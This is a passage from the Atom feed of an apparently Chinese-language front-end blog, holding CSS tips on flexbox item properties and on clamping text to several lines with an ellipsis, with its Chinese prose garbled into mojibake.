class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default set to auto */</span></span><br><span class="line">    <span class="comment">/* é€Ÿå†™æ³• */</span></span><br><span class="line">    flex: none | [ &lt;&amp;#39;flex-grow&amp;#39;&gt; &lt;&amp;#39;flex-shrink&amp;#39;&gt;? || &lt;&amp;#39;flex-basis&amp;#39;&gt; ];</span><br><span class="line">    <span class="comment">/* è‡ªæ’åˆ— */</span></span><br><span class="line">    align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ‰ä¸€ä¸ªå®¹å™¨ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;container&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS é™åˆ¶å¤šè¡Œä¸ºçœç•¥å·</title>
    <link href="http://youngdze.co/2015/08/27/css-line-clampin/"/>
    <id>http://youngdze.co/2015/08/27/css-line-clampin/</id>
    <published>2015-08-27T08:12:06.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç°åœ¨æœ‰å¦‚ä¸‹ HTMLï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"module"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®å¤šè¡Œé™åˆ¶ä¸ºçœç•¥å·å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.module</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.line-clamp</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å®½åº¦é™åˆ¶ä¸ºçœç•¥å·å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.module</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç°åœ¨æœ‰å¦‚ä¸‹ HTMLï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
</feed>
